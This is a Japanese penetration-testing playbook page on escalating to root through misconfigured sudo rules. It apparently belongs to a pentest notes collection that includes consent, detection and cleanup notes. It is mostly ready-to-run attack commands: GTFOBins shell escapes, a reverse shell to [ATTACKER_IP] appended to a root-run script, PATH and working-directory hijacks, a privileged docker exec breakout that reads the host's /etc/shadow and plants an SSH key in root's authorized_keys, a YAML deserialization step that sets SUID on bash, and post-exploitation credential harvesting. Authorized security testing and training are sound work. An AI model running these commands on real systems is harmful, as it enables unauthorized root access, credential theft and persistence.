# sudo 設定不備による権限昇格

> **スコープ**: `/etc/sudoers` の設定ミスによる権限昇格。特定コマンドへの NOPASSWD〜全コマンド許可〜スクリプト PATH ハイジャック〜docker exec ブレイクアウト〜YAML/pickle デシリアライズ〜CWD ハイジャックまで扱う。昇格後の横展開確認は「昇格成功後に確認すること」セクションへ。

## 着火条件

```bash
sudo -l
```

出力に `NOPASSWD` または特定コマンドへの許可が含まれている場合。

## 環境前提
- 実行環境: ターゲット（シェル取得済みの状態で実行）
- 必要なツール: 標準 Linux コマンド（`bash` / `find` 等）/ GTFOBins（https://gtfobins.github.io/）
- 外部リソース依存: GTFOBins はインターネット要。オフライン環境では典型ペイロードを事前メモで対応

## 先に確認すること

**`sudo -l` の出力で何に気付くか:**

| `sudo -l` に見える要素 | 示唆 | 次のアクション |
|---|---|---|
| `NOPASSWD:` | パスワード不要で sudo 実行可能 | 該当コマンドを GTFOBins で検索（§1〜§2）|
| `(ALL : ALL)` / `(ALL)` | 任意ユーザーとして実行可 | `sudo -u root [CMD]`（§2）|
| コマンドの末尾が `*`（ワイルドカード）| 引数を自由に指定可能 | サブコマンドや `--config` などから escape を狙う |
| スクリプトパスが `/opt/` / `/home/` 配下のシェルスクリプト | 自作スクリプトの可能性 | スクリプトを `cat` して内部呼び出しの形式を確認（§3 / §6）|
| `env_keep+=LD_PRELOAD` | 環境変数を引き継ぐ | 共有ライブラリ注入 |
| `sudo` のバージョンが 1.8.28 未満 | CVE-2019-14287（`!root` バイパス）候補 | `sudo -u#-1 [CMD]` を試す |
| `docker` / `docker exec` への許可 | コンテナブレイクアウト候補 | §4 へ |
| `Defaults secure_path=...` が見えていて、許可スクリプトが内部で `./xxx` を呼ぶ | CWD からの相対呼び出しは secure_path で守られない | §6（CWD ハイジャック）へ |
| スクリプトが `YAML.load` / `pickle.load` で書き込み可能なファイルを読む | デシリアライズ悪用 | §5 へ |

**攻撃者の思考トレース:** `sudo -l` の出力を読む順番は「ALL → NOPASSWD 付き標準コマンド → スクリプト（内部呼び出しを確認）→ docker → CVE 確認」。スクリプトが見つかったら必ず `cat` で中身を読んで内部呼び出しの形式を確認する。

---

## 1. 特定コマンドに NOPASSWD（GTFOBins 経由）

**コマンド例:**

```bash
# [Target] vim / nano / less
sudo vim -c ':!/bin/bash'

# [Target] python / python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# [Target] find
sudo find . -exec /bin/bash \; -quit

# [Target] awk
sudo awk 'BEGIN {system("/bin/bash")}'
```

`sudo -l` の出力例:
```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| root プロンプトが返る | root 昇格成功 | 「昇格成功後に確認すること」セクションへ |
| GTFOBins にない独自コマンド | 内部で外部コマンドを呼んでいる可能性 | PATH ハイジャック（§3）を検討 |

**注意:** 絶対パスが指定されている（`/usr/bin/vim`）場合、そのパスで呼ぶ。エディタ系（`vim` / `nano` / `less` / `more` / `man`）は「編集機能から外部コマンド実行」が共通パターン。

---

## 2. ALL コマンドを許可（`NOPASSWD: ALL`）

`sudo -l` の出力例:
```
(ALL) NOPASSWD: ALL
```

**コマンド:**

```bash
# [Target] 即座に root
sudo /bin/bash
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| root プロンプトが返る | 即 root | 「昇格成功後に確認すること」セクションへ |

**注意:** これが見えた時点で即 root。他の探索に時間を使わない。`sudo -l` 実行自体にパスワードが必要なケース（`Defaults rootpw`）がある。

---

## 3. 特定スクリプトの実行を許可（PATH ハイジャック / 書き換え）

`sudo -l` の出力例:
```
(ALL) NOPASSWD: /opt/scripts/backup.sh
```

**コマンド:**

```bash
# [Target] スクリプトが書き込み可能な場合 → 直接書き換え
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh
sudo /opt/scripts/backup.sh

# [Target] スクリプトが書き込み不可 → 内部から呼ばれる外部コマンドの PATH ハイジャック
# 1. スクリプトを cat で読む
cat /opt/scripts/backup.sh
# 2. フルパスなしで呼ばれているコマンド（例: tar, cp）を確認
# 3. /tmp/tar に偽バイナリを置いて PATH を先頭に注入
echo -e '#!/bin/bash\n/bin/bash' > /tmp/tar && chmod +x /tmp/tar
PATH=/tmp:$PATH sudo /opt/scripts/backup.sh
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| root プロンプトが返る | PATH ハイジャックまたは書き換え成功 | 「昇格成功後に確認すること」セクションへ |

**注意:** スクリプトが書き込み可能か確認: `ls -la /opt/scripts/backup.sh`。書き込み不可でも「親ディレクトリが書き込み可能」なら元ファイルを消して同名で作り直せる。`sudo` は既定で `secure_path` を強制するため単純な PATH 汚染は効かないことが多い（`env_reset` が無い / `secure_path` が定義されていない時のみ有効）。

---

## 4. docker exec へのワイルドカード NOPASSWD

`sudo -l` の出力例:
```
(root) NOPASSWD: /snap/bin/docker exec *
```

**コマンド:**

```bash
# [Target] コンテナ内で root として実行できるか確認
sudo /snap/bin/docker exec --user root [CONTAINER_ID] id
# uid=0(root) gid=0(root) groups=0(root),...

# [Target] コンテナ内でシェルを取得
sudo /snap/bin/docker exec -it --user root [CONTAINER_ID] /bin/bash

# [Target] --privileged フラグ付きでコンテナ内に root インタラクティブシェルを取得
sudo /snap/bin/docker exec -u root --privileged -it [CONTAINER_ID] bash
```

**コンテナ内でホストデバイスを特定してマウント（--privileged 時）:**

```bash
# [Target: コンテナ内] マウント状況を確認してホストのデバイスを特定
mount
# 例: /dev/sda1 on /etc/hosts type ext4 (rw,relatime) → /dev/sda1 がホストのデバイス

# [Target: コンテナ内] ホスト FS をマウント
mount /dev/sda1 /mnt
ls /mnt   # bin boot etc home root ... ← ホスト FS が見える

# [Target: コンテナ内] ホストの shadow を取得 / authorized_keys に公開鍵を書き込む
cat /mnt/etc/shadow | head -3
echo '[SSH_PUBKEY]' >> /mnt/root/.ssh/authorized_keys
```

```bash
# [Attacker] ホスト側に SSH 接続（公開鍵認証）
ssh -i [PRIVATE_KEY_PATH] root@[TARGET_IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| コンテナ内で `id` が `uid=0(root)` を返す | docker exec 経由 root 成功 | コンテナ内列挙 / ホスト FS マウント |
| `mount` でホストデバイスが見える | --privileged 経由でホスト FS アクセス可能 | `/mnt/etc/shadow` / authorized_keys 書き込み |

> なぜコンテナ内からホストのブロックデバイスが見えるのか → `../06_Concepts/Docker_Isolation.md`

**注意:** `--privileged` は `docker exec` のオプションとして使う（コンテナ自体を再起動する必要はない）。デバイス名は環境によって `vda1` / `nvme0n1p1` 等異なる（`lsblk` で確認）。コンテナIDは `/etc/hosts`（コンテナ内でのホスト名 = 16 進文字列）から確認。

---

## 5. スクリプトが YAML.load / pickle.load でユーザー書き込み可能なファイルを読む場合

`sudo -l` の出力例:
```
(root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

スクリプトを `cat` で確認した際に `YAML.load(File.read(...))` かつ読み込み先ファイルが書き込み可能なパス（相対パスや自分のホームディレクトリ）にある場合。

**コマンド:**

```bash
# [Target] スクリプトの内容と読み込みパスを確認
cat [スクリプトパス]

# [Target] 書き込み可能なディレクトリで悪意ある YAML ファイルを作成
cd [ファイルを置くディレクトリ]
# YAML ペイロードの全文 → ../05_Tools_Reference/CVE_Notes.md（Ruby YAML.load Psych Gadget Chain セクション）
cat << 'EOF' > [スクリプトが読み込むファイル名]
[ペイロード内容]
EOF

# [Target] sudo でスクリプトを実行
sudo /usr/bin/ruby [スクリプトパス]
# エラーが出ても SUID が設定済みのことがある → 次のステップで確認

# [Target] SUID が設定されたことを確認してシェルを取得
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash  ← s が付いていれば成功
/bin/bash -p
id
# euid=0(root)

# [Target] 原状回復（必須）
chmod -s /bin/bash
rm [作成したファイル名]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| YAML ペイロードで `/bin/bash` に SUID が設定される | YAML.load デシリアライズ悪用成功 | `bash -p` で root シェル取得 → 「昇格成功後に確認すること」セクションへ |
| `YAML.safe_load` が使われている | このガジェットチェーンは使えない | スクリプトの他の脆弱性（PATH ハイジャック等）を探す |
| ruby 3.1 以降 | Psych 4.0 でデフォルト safe_load 相当 | `YAML.unsafe_load` に明示変更しない限り刺さらない |

**注意:** YAML のインデントは 2 スペース厳守（タブ文字が混入するとパース失敗）。`cat << 'EOF' >` はシングルクォート付き `'EOF'` であること（ダブルクォートや引用符なしだとヒアドキュメント内の `!` や `$` がシェルに解釈される）。原理 → `../06_Concepts/YAML_Deserialization.md`

---

## 6. sudo スクリプトが内部で別スクリプトを「相対パス」で呼ぶ場合（CWD ハイジャック）

**なぜ成立するか:** スクリプトが `./xxx.sh` という形で別ファイルを呼ぶと、**カレントディレクトリにある xxx.sh** を指す。`secure_path` は PATH 環境変数を上書きする保護だが、`./` 始まりの相対パスは PATH 探索を経由しないため secure_path で守られない。

**着火条件:** `sudo -l` でスクリプトの実行が許可されており、`cat` で中身を確認したら `./xxx.sh`（相対パス呼び出し）が見つかる。スクリプト本体は書き込み不可（§3 が使えない）。

**コマンド:**

```bash
# [Target] スクリプトの中身を確認して相対呼び出しを特定
cat /usr/bin/[SCRIPT_NAME]
# 内部に以下のような相対呼び出しがある
#   ./initdb.sh 2>/dev/null
#   ./helper

# [Target] 書き込み可能なディレクトリで偽スクリプトを作成
cd /tmp
echo -e '#!/bin/bash\n/bin/bash' > /tmp/[SCRIPT_NAME]
chmod +x /tmp/[SCRIPT_NAME]

# [Target] 同じディレクトリから sudo 実行
sudo /usr/bin/[SCRIPT_NAME]
# → スクリプト内の ./[SCRIPT_NAME] が /tmp/[SCRIPT_NAME] を実行 → root 権限で /bin/bash 起動

# 確認
id
# uid=0(root) gid=0(root) groups=0(root)
```

**観測される出力 → 次のアクション:**

| 観測される症状 | 推定原因 | 次のアクション |
|---|---|---|
| root シェルが取れる | CWD ハイジャック成功 | 「昇格成功後に確認すること」セクションへ |
| スクリプトが偽物を呼ばない | 該当処理が条件分岐で skip（`pgrep` で本物が見つかっている）| 本物のプロセスを止めるか、別の相対呼び出し箇所を探す |
| `command not found` | スクリプトが `bash xxx.sh` のように呼んでいるのに `xxx` で作った | 呼び出し形式と完全一致するファイル名で作り直す |
| sudo は通るが root シェルが立たない | エラーで途中終了 | 偽スクリプトの中身をリバースシェル形式に変える |

**注意:** `secure_path` は CWD 経由の相対呼び出しを止めない（PATH ハイジャックと混同しない）。ファイル名は完全一致が必須（大文字小文字も含めて）。`pgrep -x` で存在チェックされている場合、本物のプロセスが動いている間は偽物が呼ばれない。偽スクリプトは原状回復対象（`rm /tmp/[SCRIPT_NAME]`）。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|---|---|---|
| `sudo -l` でパスワードを求められる | `Defaults rootpw` 等 | 現ユーザーのパスワードが判明していれば入力できる |
| GTFOBins の手法が通らない | secure_path / 別のパスで実行されている | スクリプトの内部呼び出しを確認（§3 / §6）|
| `sudo -l` に何も出ない | 許可設定なし | SUID / Capabilities / Kernel Exploits へ |
| `!root` 指定でも特定ユーザーにしか実行できない設定 | 古い sudo で CVE-2019-14287 が効く可能性 | `sudo -u#-1 [CMD]` を試す（sudo 1.8.28 未満）|

---

## 全パターン共通の注意点・落とし穴

- `sudo -l` は「現在のセッション・ユーザー」に対してしか表示されない。`su` / `ssh` で別ユーザーになったら再実行する
- `tty_tickets` が有効だと tty ごとにパスワードキャッシュが分かれる
- `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる

---

## 本番での前提

- **事前合意の要否**: ★★（口頭確認可）— 既存の sudo 設定を利用するのみ。`/etc/passwd` 改変・`xp_cmdshell` 有効化等は別途書面承認必須
- **想定される SIEM/EDR 検知**: `sudo` ログ（`/var/log/auth.log`）への実行記録 / auditd の `sudo -l` / スクリプト実行ログ
- **業務影響リスク**: 低（既存設定の利用）/ スクリプト改ざんを伴う場合は影響範囲に注意
- **原状回復必須項目**: ✅ 書き換えたスクリプトを元に戻す（`git checkout` 等）/ ✅ PATH に注入した偽バイナリを削除 / ✅ SUID を新たに設定した場合は `chmod -s` でクリア
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 昇格成功後に確認すること（横展開観点）

**「sudo で root になれた = ゴール」ではない。**

- `/root/.ssh/` 配下の秘密鍵 → 他ホストへの SSH 接続性の確認
- `/etc/shadow` 全エントリのハッシュ → 他システムでのパスワード使い回し検証（`hashcat` で一括クラック）
- `/root/.bash_history` → 直近の接続先・コマンド履歴
- root cron / systemd サービスへの認証情報の埋め込み
- **Docker ブレイクアウト成功時**: ホスト FS マウント後に `/mnt/root/.ssh/` / `/mnt/etc/shadow` / `/mnt/root/.bash_history` を確認する
- 内部サービス（DB・管理画面・API）の設定ファイル・環境変数 → 接続情報・シークレット
- AD 連携設定（`/etc/sssd/sssd.conf` / `/etc/krb5.conf`）→ ドメイン側資格情報の可能性

---

## 関連技術

- 前：侵入後の列挙チェックリスト → `Enumeration_Checklist.md`
- 後：その他の昇格手法 → `Capabilities.md` / `SUID_SGID.md`
- 関連：Docker 分離の原理（なぜ効くか）→ `../06_Concepts/Docker_Isolation.md`
- 関連：YAML.load が任意コード実行できる原理 → `../06_Concepts/YAML_Deserialization.md`
- 関連：パストラバーサルでコンテナ ID を特定 → `../02_Initial_Access/Web_Vulnerabilities/Path_Traversal.md`
